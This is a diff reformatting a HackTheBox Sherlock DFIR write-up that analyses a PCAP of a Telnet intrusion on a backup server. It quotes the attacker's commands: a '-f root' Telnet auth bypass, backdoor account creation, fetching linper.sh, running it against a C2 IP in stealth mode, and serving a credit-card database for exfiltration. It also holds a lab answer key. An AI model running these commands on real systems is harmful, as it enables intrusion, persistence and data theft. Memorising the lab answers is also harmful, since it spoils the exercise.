@@ -1,36 +1,37 @@
-# Telly — HackTheBox Sherlock Writeup
+# HTB Sherlock — Telly
 
-**Prepared by:** Djibril Gathoni  
-**Difficulty:** Easy  
-**Category:** DFIR / Network Forensics  
+**Category:** DFIR / Network Forensics
+**Difficulty:** Easy
+**Author:** Djibril Gathoni
 **Date:** July 2026
 
 ---
 
-## 1. Scenario Overview
+## Scenario
 
-> *You are a Junior DFIR Analyst at an MSSP that provides continuous 
-> monitoring and DFIR services to SMBs. Your supervisor has tasked you 
-> with analyzing network telemetry from a compromised backup server. 
-> A DLP solution flagged a possible data exfiltration attempt from 
-> this server. According to the IT team, this server wasn't very busy 
-> and was sometimes used to store backups.*
+You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to
+SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup
+server. A DLP solution flagged a possible data exfiltration attempt from this server. According to
+the IT team, this server wasn't very busy and was sometimes used to store backups.
 
 ---
 
-## 2. Artifacts & Evidence
+## Tools Used
 
-| Artifact | Description |
-|----------|-------------|
-| `Telly.zip` | Password-protected archive provided by HTB (5 MB) |
-| `monitoringservice_export_202610AM-11AM.pcapng` | Network capture from the compromised backup server |
+- Wireshark — PCAP analysis, TCP stream reconstruction, HTTP object export
+- `sqlite3` — querying the exfiltrated database
+- `unzip` — extracting the HTB-provided artifact
+- Knowledge of Telnet protocol negotiation and CVE-2026-24061
 
-### Extracting the Artifact
+---
 
-The investigation begins by locating the artifact in the Downloads 
-folder:
+## Investigation
 
-![Downloads folder](Screenshots/2026-07-01%2015_34_34-VirtualBoxVM.png)
+### Setup — Extracting the Artifact
+
+The investigation starts by locating the HTB-provided archive in the Downloads folder:
+
+![Downloads folder](screenshots/setup-downloads.png)
 
 Extract using the HTB-provided password:
 
@@ -39,7 +40,7 @@ cd ~/Downloads/telly
 unzip Telly.zip
 ```
 
-![Unzipped Telly](Screenshots/unzipped%20telly.png)
+![Unzipped Telly](screenshots/setup-unzip.png)
 
 Open the PCAP in Wireshark:
 
@@ -47,195 +48,157 @@ Open the PCAP in Wireshark:
 wireshark Telly/monitoringservice_export_202610AM-11AM.pcapng
 ```
 
-![Wireshark opened](Screenshots/Telly%201.png)
+![Wireshark opened](screenshots/setup-wireshark-open.png)
 
 ---
 
-## 3. Investigation
+### Task 1 — What CVE is associated with the vulnerability exploited in the Telnet protocol?
 
-### 3.1 Initial Access — CVE-2026-24061
+Filtering for Telnet traffic (`tcp.port == 23`) and following the relevant TCP stream (Stream 14),
+the exploitation technique is visible right at the top:
 
-**Task 1: What CVE is associated with the vulnerability exploited 
-in the Telnet protocol?**
+![Task 1 terminal output](screenshots/task1-terminal.png)
 
-**Answer: `CVE-2026-24061`**
+The attacker passed `-f root` as the `NEW-ENVIRON USER` value during Telnet option negotiation.
+This tricks the `login` binary into treating `root` as pre-authenticated, bypassing the password
+check entirely — the technique associated with **CVE-2026-24061**.
 
-![Task 1 Answer](Screenshots/Task%201.png)
+**Answer:** `CVE-2026-24061`
 
-Filter for Telnet traffic in Wireshark:
-tcp.port == 23
-
-Right-click any Telnet packet → **Follow → TCP Stream** (Stream 14).
-
-At the very top of the stream, the exploitation technique is 
-immediately visible:
-USER.-f root.DISPLAY.kali:0.0.....XTERM-256COLOR
-
-The attacker passed `-f root` as the `NEW-ENVIRON USER` value via 
-the Telnet option negotiation. This tricks the `login` binary into 
-treating root as pre-authenticated, bypassing the password check 
-entirely. This is the exploitation technique associated with 
-**CVE-2026-24061**.
+![Task 1 answer](screenshots/task1-answer.png)
 
 ---
 
-### 3.2 Target Identification & Timeline
+### Task 2 — When was the Telnet vulnerability successfully exploited, granting the attacker remote root access?
 
-**Task 2: When was the Telnet vulnerability successfully exploited, 
-granting the attacker remote root access?**
+Still within TCP Stream 14, the Ubuntu MOTD banner printed immediately after the root shell was
+granted includes the system's own timestamp:
 
-**Answer: `2026-01-27 10:39:28`**
-
-![Task 2 Answer](Screenshots/Task%202.png)
-
-Following TCP Stream 14, the Ubuntu MOTD banner confirms the 
-moment the root shell was granted:
+```
 Linux 6.8.0-90-generic (backup-secondary) (pts/1)
 "Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)"
 System information as of Tue Jan 27 10:39:28 UTC 2026
+```
 
-The system timestamp printed at login — `2026-01-27 10:39:28` — 
-marks the exact moment the attacker gained root access.
+![Task 2 terminal output](screenshots/task2-terminal.png)
 
----
+That system timestamp marks the exact moment the attacker gained root access.
 
-**Task 3: What is the hostname of the targeted server?**
+**Answer:** `2026-01-27 10:39:28`
 
-**Answer: `backup-secondary`**
-
-![Task 3 Answer](Screenshots/Task%203.png)
-
-The hostname appears in two places within the TCP stream:
-
-1. The kernel banner: `Linux 6.8.0-90-generic (backup-secondary)`
-2. Every subsequent shell prompt: `root@backup-secondary:~#`
+![Task 2 answer](screenshots/task2-answer.png)
 
 ---
 
-### 3.3 Persistence — Backdoor Account
+### Task 3 — What is the hostname of the targeted server?
 
-**Task 4: The attacker created a backdoor account to maintain future 
-access. What username and password were set for that account?**
+The hostname appears in the same stream in two places: the kernel banner
+(`Linux 6.8.0-90-generic (backup-secondary)`) and every subsequent shell prompt
+(`root@backup-secondary:~#`).
 
-**Answer: `cleanupsvc:YouKnowWhoiam69`**
+**Answer:** `backup-secondary`
 
-![Task 4 Answer](Screenshots/Question%204.png)
+![Task 3 answer](screenshots/task3-answer.png)
 
-Still within TCP Stream 14, the attacker ran the following command:
+---
+
+### Task 4 — The attacker created a backdoor account to maintain future access. What username and password were set for that account?
+
+Still within TCP Stream 14, the attacker ran:
 
 ```bash
 sudo useradd -m -s /bin/bash cleanupsvc; \
 echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
 ```
 
-The account was deliberately named `cleanupsvc` to blend in as a 
-legitimate maintenance service account — a classic attacker technique 
-to avoid detection during a casual review of system users.
+The account was deliberately named `cleanupsvc` to blend in as a legitimate maintenance service
+account — a classic technique to avoid detection during a casual review of system users. Its
+creation was later confirmed in a `/etc/shadow` dump the attacker performed, where its epoch date
+(`20480`) sits one day after every legitimate account (`20479`).
 
-The account creation is later confirmed in the `/etc/shadow` dump 
-the attacker performed:
-cleanupsvc:yy
-yj9TZ2NfVyVsu8gxGb1aZtCRr.Z2NfVyVsu8gxGb1aZtCRr.
-Z2NfVyVsu8gxGb1aZtCRr.Ed0czry6Sp...:20480:0:99999:7:::
+**Answer:** `cleanupsvc:YouKnowWhoiam69`
 
-The epoch date `20480` is one day after all legitimate accounts 
-(`20479`), further confirming it was created during the intrusion.
+![Task 4 answer](screenshots/task4-answer.png)
 
 ---
 
-### 3.4 Persistence — C2 Infrastructure
+### Task 5 — What was the full command the attacker used to download the persistence script?
 
-**Task 5: What was the full command the attacker used to download 
-the persistence script?**
+Individual Telnet data packets in Stream 14 capture the attacker's keystrokes one character at a
+time. Tracking frames in chronological order (3940 → 3943 → 3946 → 3951) spells out the command as
+it was typed, letter by letter:
 
-**Answer:**
-wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
+![Task 5 terminal — 'w'](screenshots/task5-terminal-w.png)
+![Task 5 terminal — 'g'](screenshots/task5-terminal-g.png)
+![Task 5 terminal — 'e'](screenshots/task5-terminal-e.png)
+![Task 5 terminal — 't'](screenshots/task5-terminal-t.png)
 
-![Task 5 Answer](Screenshots/Question%205.png)
-
-After establishing the backdoor account, the attacker downloaded 
-the open-source Linux persistence framework **linper.sh** from 
-GitHub into `/tmp`:
+Reassembling the full stream, the attacker downloaded the open-source Linux persistence framework
+**linper.sh** from GitHub into `/tmp`:
 
 ```bash
-wget https://raw.githubusercontent.com/montysecurity/linper/\
-refs/heads/main/linper.sh
+wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
 chmod +x linper.sh
 ```
 
+**Answer:** `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`
+
+![Task 5 answer](screenshots/task5-answer.png)
+
 ---
 
-**Task 6: The attacker installed remote access persistence using 
-the persistence script. What is the C2 IP address?**
+### Task 6 — The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
 
-**Answer: `91.99.25.54`**
-
-![Task 6 Answer](Screenshots/Task%206.png)
-
-The attacker ran linper.sh with the C2 IP and port as arguments:
+The attacker ran `linper.sh` with the C2 IP and port as arguments:
 
 ```bash
 bash linper.sh 91.99.25.54 --p 59 --stealth-mode
 ```
 
-The `--stealth-mode` flag instructed linper to timestomp all 
-modified persistence files and install persistence across multiple 
-vectors simultaneously.
+![Task 6 terminal output](screenshots/task6-terminal.png)
 
-Persistence was installed across the following locations using 
-`awk`, `bash`, `nc`, `perl`, `python3`, `pwsh`, and `telnet`:
+The `--stealth-mode` flag instructed linper to timestomp all modified persistence files and install
+persistence across multiple vectors simultaneously — `/var/spool/cron/crontabs/root`,
+`/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, and `/etc/rc.local` (via `bash`, `nc`, `perl`,
+`python3`, `pwsh`, and `telnet`).
 
-| Location | Method |
-|----------|--------|
-| `/var/spool/cron/crontabs/root` | Multiple |
-| `/etc/crontab` | Multiple |
-| `/etc/cron.d/` | Multiple |
-| `/etc/systemd/` | Multiple |
-| `/etc/rc.local` | bash, nc, perl, python3, pwsh, telnet |
+**Answer:** `91.99.25.54`
+
+![Task 6 answer](screenshots/task6-answer.png)
 
 ---
 
-### 3.5 Data Exfiltration & Breach Analysis
+### Task 7 — The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?
 
-**Task 7: The attacker exfiltrated a sensitive database file. 
-At what time was this file exfiltrated?**
-
-**Answer: `2026-01-27 10:49:54`**
-
-![Wireshark port 6932 filter](Screenshots/Wireshark.png)
-
-![Task 7 Wireshark Evidence](Screenshots/Task%207.png)
-
-After establishing persistence, the attacker navigated to `/opt` 
-and found a sensitive database:
-/opt/credit-cards-25-blackfriday.db
-
-They served it over HTTP using Python's built-in HTTP server on 
-port 6932:
+After establishing persistence, the attacker navigated to `/opt` and found a sensitive database:
+`/opt/credit-cards-25-blackfriday.db`. They served it over HTTP using Python's built-in HTTP
+server on port 6932:
 
 ```bash
 python3 -m http.server 6932
 ```
 
-Filtering for `tcp.port == 6932` in Wireshark reveals the 
-exfiltration event. Frame 9377 contains the HTTP access log 
-entry confirming the exact timestamp:
-192.168.72.131 - - [27/Jan/2026 10:49:54]
-"GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
+Filtering the PCAP for `tcp.port == 6932` reveals the exfiltration event — the HTTP access log
+entry inside the Telnet-relayed shell session confirms the exact timestamp:
+
+```
+192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
+```
+
+![Task 7 terminal output](screenshots/task7-terminal.png)
 
 The attacker then deleted the file to cover their tracks.
 
+**Answer:** `2026-01-27 10:49:54`
+
+![Task 7 answer](screenshots/task7-answer.png)
+
 ---
 
-**Task 8: Find the credit card number for a customer named 
-Quinn Harris.**
+### Task 8 — Analyze the exfiltrated database. Find the credit card number for a customer named Quinn Harris.
 
-**Answer: `5312269047781209`**
-
-![Task 8 Answer](Screenshots/Last%20question.png)
-
-The database was carved from the PCAP via 
-**File → Export Objects → HTTP** in Wireshark.
+The database was carved out of the PCAP via **File → Export Objects → HTTP** in Wireshark, then
+queried directly:
 
 ```bash
 sqlite3 credit-cards-25-blackfriday.db
@@ -252,104 +215,43 @@ SELECT * FROM purchases WHERE email LIKE '%quinn.harris%';
 -- 12|quinn.harris@hotmail.com|5312269047781209|2025-12-08|4K monitor
 ```
 
-Quinn Harris's credit card number: **`5312269047781209`**
+![Task 8 terminal output](screenshots/task8-terminal.png)
+
+**Answer:** `5312269047781209`
+
+![Task 8 answer](screenshots/task8-answer.png)
 
 ---
 
-## 4. Attack Chain Summary
-[Attacker: 192.168.72.131]
-|
-| Telnet to port 23
-| NEW-ENVIRON USER = "-f root" (CVE-2026-24061)
-|
-v
-[Target: backup-secondary (192.168.72.136)]
-|
-| Root shell granted — 2026-01-27 10:39:28
-|
-|— Backdoor account created: cleanupsvc:YouKnowWhoiam69
-|
-|— linper.sh downloaded from GitHub
-|   Persistence installed across cron, systemd, rc.local
-|   C2: 91.99.25.54:59 (stealth mode, timestomped)
-|
-|— /opt/credit-cards-25-blackfriday.db discovered
-|   Served via python3 HTTP server on port 6932
-|   Exfiltrated at 2026-01-27 10:49:54
-|
-|— Database deleted to cover tracks
-|
-v
-[Attacker exits — persistence mechanisms remain active]
+## Attack Timeline
+
+| Time (UTC)              | Action                                                             |
+| ------------------------ | ------------------------------------------------------------------ |
+| 2026-01-27 10:39:28       | Attacker exploits CVE-2026-24061 via Telnet, gains root on `backup-secondary` |
+| 2026-01-27 10:39:28+       | Backdoor account created: `cleanupsvc:YouKnowWhoiam69`            |
+| 2026-01-27 10:39:28+       | `linper.sh` downloaded from GitHub and executed against C2 `91.99.25.54:59` (stealth mode) |
+| 2026-01-27 10:39:28+       | Persistence installed across cron, systemd, and rc.local          |
+| 2026-01-27 ~10:49:xx       | Attacker discovers `/opt/credit-cards-25-blackfriday.db`, serves it via `python3 -m http.server 6932` |
+| 2026-01-27 10:49:54       | Database exfiltrated                                              |
+| 2026-01-27 10:49:54+       | Database deleted to cover tracks                                  |
 
 ---
 
-## 5. MITRE ATT&CK Mapping
+## Key Takeaways
 
-| Tactic | Technique | ID | Description |
-|--------|-----------|-----|-------------|
-| Initial Access | Exploit Public-Facing Application | T1190 | CVE-2026-24061 Telnet exploit |
-| Persistence | Create Account | T1136.001 | cleanupsvc backdoor account |
-| Persistence | Scheduled Task/Job: Cron | T1053.003 | linper.sh cron persistence |
-| Persistence | RC Scripts | T1037.004 | /etc/rc.local modification |
-| Command & Control | Non-Standard Port | T1571 | C2 on port 59 |
-| Defense Evasion | Timestomp | T1070.006 | linper --stealth-mode |
-| Collection | Data from Local System | T1005 | SQLite database discovery |
-| Exfiltration | Exfiltration Over Web Service | T1567 | python3 HTTP server on port 6932 |
-| Impact | Data Destruction | T1485 | Database deleted post-exfil |
-
----
-
-## 6. Lessons Learned
-
-- **Telnet should never be exposed** — it transmits data in 
-  plaintext and carries critical vulnerabilities. Replace with SSH.
-- **Monitoring legacy protocol ports** (port 23) would have 
-  flagged this intrusion immediately.
-- **Backup servers are high-value targets** — they often store 
-  sensitive data and receive less security attention than 
-  production systems.
-- **DLP solutions work** — the exfiltration was caught by the 
-  DLP alert that triggered this investigation.
-- **Open source persistence tools** like linper.sh are freely 
-  available and actively used by threat actors.
+- **Telnet should never be exposed** — it transmits data in plaintext and carries critical
+  vulnerabilities like CVE-2026-24061. Replace with SSH.
+- **Monitoring legacy protocol ports** (port 23) would have flagged this intrusion immediately.
+- **Backup servers are high-value targets** — they often store sensitive data and receive less
+  security attention than production systems.
+- **DLP solutions work** — the exfiltration was caught by the DLP alert that triggered this
+  investigation.
+- **Open-source persistence tools** like `linper.sh` are freely available and actively used by
+  threat actors to establish multi-vector, stealth persistence in seconds.
+- **Telnet's plaintext nature is a double-edged sword for the attacker** — every keystroke,
+  including the exact command used to fetch their tooling, was fully reconstructable from the
+  capture.
 
 ---
 
-## 7. Remediation Recommendations
-
-| Finding | Recommendation |
-|---------|---------------|
-| Telnet exposed on port 23 | Disable telnetd immediately. Migrate to SSH. |
-| CVE-2026-24061 | Patch or replace the vulnerable telnetd binary. |
-| Backdoor account (cleanupsvc) | Remove account, audit all users, enforce account creation monitoring. |
-| Cron/systemd persistence | Audit all cron files and systemd units for unauthorized entries. |
-| C2 communication to 91.99.25.54 | Block IP at firewall, review egress filtering policy. |
-| Sensitive data in /opt | Review data storage policies. Sensitive databases should not reside on backup servers. |
-| Evidence destruction | Implement file integrity monitoring (FIM) on sensitive directories. |
-
----
-
-## 8. Task Answers
-
-| Task | Question | Answer |
-|------|----------|--------|
-| 1 | CVE associated with Telnet vulnerability | `CVE-2026-24061` |
-| 2 | Timestamp of successful exploitation | `2026-01-27 10:39:28` |
-| 3 | Hostname of targeted server | `backup-secondary` |
-| 4 | Backdoor account credentials | `cleanupsvc:YouKnowWhoiam69` |
-| 5 | Full command to download persistence script | `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh` |
-| 6 | C2 IP address | `91.99.25.54` |
-| 7 | Time of database exfiltration | `2026-01-27 10:49:54` |
-| 8 | Quinn Harris credit card number | `5312269047781209` |
-
----
-
-## 9. References
-
-- [CVE-2026-24061](https://www.cve.org/)
-- [linper.sh — Linux Persistence Framework](https://github.com/montysecurity/linper)
-- [MITRE ATT&CK Framework](https://attack.mitre.org/)
-- [Wireshark Documentation](https://www.wireshark.org/docs/)
-
-
+*Writeup by Djibril Gathoni | [LinkedIn](https://linkedin.com/in/djibrilgathoni) | [GitHub](https://github.com/Djibrilgathoni)*
